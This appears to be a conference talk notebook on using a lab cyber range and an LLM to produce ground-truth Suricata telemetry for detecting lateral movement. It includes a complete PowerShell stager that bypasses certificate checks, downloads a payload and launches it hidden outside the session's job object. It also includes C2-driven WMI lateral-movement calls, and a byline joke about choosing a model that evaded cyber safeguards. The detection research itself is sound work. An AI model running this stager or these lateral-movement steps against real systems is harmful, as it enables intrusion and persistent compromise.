# AI-powered Cyber Range for Suricata Detection Engineering

* presentation agent: Markus Kont
* co-authored by: Whatever model did not trigger cyber policy safeguards at the time

## About

* One cannot detect without understanding the attack
    * ground truth is in short supply
* Everything else is plumbing
    * where most effort goes

## /whoami

* Security researcher and developer at [Stamus](https://github.com/stamusnetworks)
    * detection engineering and data analytics
* Former researcher, NATO CCDCOE
    * red-blue exercises, trainings, research, etc
* Rooted in devops and infra
* Digital sloyd

## /offline

![Making things](assets/making-things.jpg)

## Previously on Suricon..

* 2019 - red team telemetry and feedback, NATO exercises
* 2022 - jupyter notebooks for Suricata EVE
    * better EVE visibility, random case study
* 2024 - EVE SMB study for lateral movement detection
    * What NSM doesn't see
    * Going outside of typical PCAP workflow
    * random samples, no ground truth
* 2025 - enriching suricata EVE with endpoint logs
    * Real offensive telemetry
    * I accidentally a cyber range

## Cyber Range?

* **Why**: ground truth is scarce
    * Started off as simple IaC reorg
    * Live traffic is hard to control
    * Offline PCAPs: too small, no context
    * Best data is never shared
* **What**: Virtual, **controlled** environment
    * For trainings, exercises, etc
    * Scales from a few VMs to datacentres
    * IaC definition
    * Redeployable, baby!
    * Real telemetry, underused
* **How**: law of the wasteland

## Thou get sidetracked by BS every time

<img src="assets/da-ghoul.jpg" width="600">

## Pending TODO

* Should be trivial
* Payload → execute → beacon → Suricata sees it
* Automation keeps failing
    * beacon does not spawn
    * spawns but is then dead
    * spawns and is alive, but playbook stalls
    * ...

## Mähis

* https://github.com/ansible/ansible/blob/devel/lib/ansible/executor/powershell/async_wrapper.ps1
* https://github.com/ansible/ansible/blob/devel/lib/ansible/module_utils/csharp/Ansible._Async.cs
* `WinRM and sshd run inside a job object; child processes inherit it and are killed when the session closes`

In [ ]:
def build_powershell_script(payload_fname, staged_url):
    """The known-good delivery recipe, verbatim from the validated foothold.

    Load-bearing parts (do not "simplify"):
      * cert-bypass via an Add-Type C# delegate — a `{$true}` script block has
        no runspace on the SSL worker thread under Win11 PS 5.1.
      * stage under $env:TEMP — the GPO-hardened image denies non-admins Write
        on C:\\Users\\Public.
      * PE sanity check — a still-building payload serves an error body, and
        CreateProcess then rejects it as a bad image (err 193). Fail loud here.
      * CreateProcess with CREATE_BREAKAWAY_FROM_JOB — a plain download-and-run
        (curl / Start-Process) inherits sshd's job object and is killed on
        session close: the agent "spawns but is dead". This is the fix for that.
    """
    return f"""
Add-Type -TypeDefinition @"
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public static class CertTrust {{
    public static void Init() {{
        ServicePointManager.ServerCertificateValidationCallback +=
            delegate(object s, X509Certificate c, X509Chain ch, SslPolicyErrors e) {{ return true; }};
    }}
}}
"@
[CertTrust]::Init()
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
$payload = Join-Path $env:TEMP '{payload_fname}'
$wc = New-Object System.Net.WebClient
$wc.DownloadFile('{staged_url}', $payload)

$len = (Get-Item $payload).Length
$hdr = [System.IO.File]::ReadAllBytes($payload)[0..1] -join ','
if ($len -lt 10000 -or $hdr -ne '77,90') {{
    Write-Output ('payload_bad size=' + $len + ' hdr=' + $hdr)
    exit 1
}}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class HeadlessSpawn {{
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFO {{
        public Int32 cb; public string lpReserved; public string lpDesktop; public string lpTitle;
        public Int32 dwX; public Int32 dwY; public Int32 dwXSize; public Int32 dwYSize;
        public Int32 dwXCountChars; public Int32 dwYCountChars; public Int32 dwFillAttribute;
        public Int32 dwFlags; public Int16 wShowWindow; public Int16 cbReserved2;
        public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
    }}
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {{
        public IntPtr hProcess; public IntPtr hThread; public Int32 dwProcessId; public Int32 dwThreadId;
    }}
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
}}
"@

$si = New-Object HeadlessSpawn+STARTUPINFO
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][HeadlessSpawn+STARTUPINFO])
$si.dwFlags = 1                # STARTF_USESHOWWINDOW
$si.wShowWindow = 0            # SW_HIDE
$pi = New-Object HeadlessSpawn+PROCESS_INFORMATION
$flags = 0x01000000 -bor 0x08000000   # CREATE_BREAKAWAY_FROM_JOB | CREATE_NO_WINDOW
$ok = [HeadlessSpawn]::CreateProcess(
    $payload, $null,
    [IntPtr]::Zero, [IntPtr]::Zero, $false, $flags,
    [IntPtr]::Zero, [System.IO.Path]::GetDirectoryName($payload),
    [ref]$si, [ref]$pi)
if ($ok) {{
    Write-Output ('payload_launched pid=' + $pi.dwProcessId)
}} else {{
    $e = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Write-Output ('payload_failed err=' + $e)
    exit 1
}}
"""

## Pass the butter

* Start from docs and API refs
* Skill starts as *theory*, matures by use
* Verbose output = *know-how*
* Run the skill live against the range
* **Capture the quirks**!
* Model debugs the skill live

<img src="assets/pass-the-butter.jpg" width="600">

## Railroad models with helper scripts

* Compound actions → small scripts
* Skill calls scripts; atomic actions as fallback
* Agent = script kiddie that handles drift

In [ ]:
from adsim.tuoni.manage import tuoni_prep, tuoni_verify
from adsim.tuoni.deliver import tuoni_deliver
from adsim.tuoni.lateral import tuoni_lateral
from adsim.tuoni.cleanup import tuoni_cleanup
from adsim.exercise import Run
from adsim.postmortem.eve import pm_eve
from adsim.postmortem.pcap import pm_pcap

## The lab

<img src="assets/cyber-range-lab.png" width="600">

## Simulation run

* **run** is a repeatable unit of work
* boring by design
* everything drifts: env, techniques, noise, detections
* inventory changes between runs
* humans miss things

In [ ]:
from dotenv import load_dotenv
load_dotenv()

EXER_RUNS_DIR = "runs"

In [ ]:
!ls -lah runs/

## Clerk, not a wizard

* clean state → open run
* embed ground truth
    * affected targets
    * offensive technique
    * EVE filters
    * timespan

In [ ]:
import os

tuoni_cleanup(
    api=os.environ["TUONI_API"],
    user=os.environ["TUONI_USER"],
    password=os.environ["TUONI_PASS"],
    erase=True,
)

In [ ]:
run = Run(
    EXER_RUNS_DIR,
    "lateral-wmi",
    techniques=["T1021.002", "T1047"],
    targets=[os.environ["TARGET_WS"], os.environ["TARGET_DC"]],
    eve_filter=[
        f"src_ip: {os.environ['TARGET_WS_IP']} AND dest_ip: {os.environ['TARGET_DC_IP']}",
        f"src_ip: {os.environ['TARGET_DC_IP']} AND dest_ip: {os.environ['TUONI_IP']}"
    ],
).open()
run

## Initial compromise

* goal: lateral movement, not initial access
* clean slate initial compromise
    * C2 ready → deliver → beacon alive
* real world: phishing, drive-by
* lab shortcut, accepted

In [ ]:
prep = tuoni_prep(
    api=os.environ["TUONI_API"],
    user=os.environ["TUONI_USER"],
    password=os.environ["TUONI_PASS"],
    payload_id=None,
    target_ip=os.environ["TARGET_WS_IP"],
    exec_user=os.environ["EXEC_USER"],
)

In [ ]:
deliv = tuoni_deliver(
    staged_url=prep["staged_url"],
    target=os.environ["TARGET_WS_IP"],
    exec_user=os.environ["EXEC_USER"],
    exec_pass=os.environ["EXEC_PASS"],
    settle=10,
)

In [ ]:
verify = tuoni_verify(
    api=os.environ["TUONI_API"],
    user=os.environ["TUONI_USER"],
    password=os.environ["TUONI_PASS"],
    pid=int(deliv["pid"]),
    known=",".join(prep["known_guids"]),
    max_wait=120,
)

## jump-wmi

* WMI (Windows Management Instrumentation)
    * built-in remote admin API
    * valid admin creds = remote exec
* DCOM (Distributed COM)
    * WMI's transport
    * port 135 broker → dynamic port

In [ ]:
tuoni_lateral(
    op="jump-wmi",
    api=os.environ["TUONI_API"],
    user=os.environ["TUONI_USER"],
    password=os.environ["TUONI_PASS"],
    source=verify["guid"],
    payload_id=prep["payload_id"],
    target=os.environ["TARGET_DC"],
    username=os.environ["LATERAL_USER"],
    target_password=os.environ["LATERAL_PASS"],
    max_wait=120,
)

In [ ]:
tuoni_cleanup(
    api=os.environ["TUONI_API"],
    user=os.environ["TUONI_USER"],
    password=os.environ["TUONI_PASS"],
    erase=True,
)

## Fetch and freeze EVE

* Telemetry is the product
* Live, yet repeatable
* Frozen per run

In [ ]:
run.close()
pm_eve(run.dir, elk_url=os.environ["ELK_URL"], resolve_flows=True, fetch_delay=30)

In [ ]:
import pandas as pd
import json

DF = pd.json_normalize(json.loads((run.dir / "artifacts-suricata-eve.json").read_text()))
DF.groupby(["event_type"]).size()

In [ ]:
def uniq(s):
    vals = s.dropna().map(lambda v: str(int(v)) if isinstance(v, float) and v.is_integer() else str(v))
    return ", ".join(vals.loc[~vals.isin(["", "<empty>"])].unique())

META = [c for c in [
    "krb5.cname",
    "krb5.sname",
    "smb.share",
    "smb.filename",
    "fileinfo.filename",
] if c in DF.columns]

SEQUENCE = (
    DF
    .assign(**{"dcerpc.interfaces": lambda df: df["dcerpc.interfaces"].map(
        lambda l: ", ".join(i["uuid"] for i in l) if isinstance(l, list) else None)})
    .groupby("flow_id")
    .agg(
        first_seen=("timestamp", "min"),
        src=("src_ip", "first"),
        dest=("dest_ip", "first"),
        port=("dest_port", "first"),
        event_type=("event_type", uniq),
        records=("event_type", "count"),
        bytes_toserver=("flow.bytes_toserver", "max"),
        bytes_toclient=("flow.bytes_toclient", "max"),
        alerts=("alert.signature", uniq),
        **{c: (c, uniq) for c in META},
    )
    .assign(metadata=lambda df: df[META].apply(
        lambda r: "; ".join(f"{k}: {v}" for k, v in r.items() if v), axis=1))
    .drop(columns=META)
    .sort_values(by=["first_seen", "port"])
)

with pd.option_context("display.max_rows", None, "display.max_colwidth", None):
    display(SEQUENCE)

## Cross tool correlation

* PCAP too, via community_id
* Endpoint context

In [ ]:
cids = DF["community_id"].dropna().unique().tolist()
len(cids)

In [ ]:
pm_pcap(
    run.dir,
    arkime_url=os.environ["ARKIME_URL"],
    arkime_user=os.environ["ARKIME_USER"],
    arkime_pass=os.environ["ARKIME_PASS"],
)

In [ ]:
!ls -lah runs/*

## Aga kuidas see kõik tehisintellektiga seotud on??

...Ega vist olegi

<img src="assets/öööööö.jpg" width="600">

## Findings generation

* Demystify the LLM step
* LLM digest helps, even on a deterministic path
* Prebaked; compare samples, no live call
* Slow, randomly fails
* Its table inspired the pandas view

In [ ]:
FINDINGS_COLS = [
    # universal
    "timestamp", "event_type", "flow_id", "community_id",
    "src_ip", "dest_ip", "src_port", "dest_port", "proto", "app_proto",
    # protocol — dcerpc
    "dcerpc.request", "dcerpc.response", "dcerpc.req.opnum", "dcerpc.interfaces",
    # protocol — smb
    "smb.command", "smb.status", "smb.filename", "smb.share",
    # protocol — krb5
    "krb5.msg_type", "krb5.cname", "krb5.sname", "krb5.realm",
    # protocol — tls
    "tls.version", "tls.ja3.hash", "tls.ja4", "tls.subject", "tls.issuerdn",
    # protocol — dns, http, file
    "dns.type", "dns.queries",
    "http.hostname", "http.url", "http.http_method", "http.http_user_agent",
    "fileinfo.filename", "fileinfo.sha256", "fileinfo.size",
    # alerts (enrichment)
    "alert.signature", "alert.signature_id", "alert.category",
    "alert.severity", "alert.action",
    # flow close
    "flow.bytes_toserver", "flow.bytes_toclient",
    "flow.start", "flow.end", "flow.state",
]

available = [c for c in FINDINGS_COLS if c in DF.columns]
EVE_CSV = DF[available].sort_values("timestamp").to_csv(index=False)
print(f"{len(available)}/{len(DF.columns)} columns retained, {len(DF.columns) - len(available)} trimmed, {len(EVE_CSV)} bytes")

In [ ]:
from pathlib import Path

skill_text = Path("skills/suricata-eve/SKILL.md").read_text()
run_meta = json.loads(run.marker_path.read_text())

system_msg = skill_text
user_msg = f"Generate findings.md for this run.\n\nRun metadata:\n{json.dumps(run_meta, indent=2)}\n\nSuricata EVE (CSV, {len(available)} columns, {len(DF)} events):\n{EVE_CSV}"
print(f"system: {len(system_msg)} chars, user: {len(user_msg)} chars")

In [ ]:
from openai import OpenAI

if not os.environ.get("LLM_KEY"):
    print("LLM_KEY not set — skipping findings generation")
else:
    llm = OpenAI(base_url=os.environ.get("LLM_URL", "https://openrouter.ai/api/v1"), api_key=os.environ["LLM_KEY"])
    resp = llm.chat.completions.create(
        model=os.environ["LLM_MODEL"],
        messages=[{"role": "system", "content": system_msg}, {"role": "user", "content": user_msg}],
    )
    findings = resp.choices[0].message.content
    findings = findings[findings.index("# findings — "):]  # drop any reasoning preamble
    (run.dir / "findings.md").write_text(findings)

In [ ]:
from IPython.display import Markdown

findings_path = run.dir / "findings.md" if os.environ.get("LLM_KEY") else Path('runs', '2026-11-11-1319-lateral-wmi', "findings.md")

print(findings_path)

if findings_path.is_file():
    display(Markdown(findings_path.read_text().replace("$", r"\$")))
else:
    print("no findings.md — run LLM cell or place file manually")

## Takeaways

* Generating findings is not the end, real detection engineering just begins
    * workflow loops, easy to lose track
* AI version 90-10% split
    * fog of war, calling BS is critical
    * law of the wasteland is still there
    * easy to fall into coding agent loop
    * make it boring
    * deterministic scripts with live feedback still win
* App-layer behavior, lost telemetry
    * midstream pickup
    * `app-layer.protocols.smb.max-tx`
* Discussion point - how to share the output
    * even small corpus is a wasteful commit
    * presentation repo is a snapshot

## Fin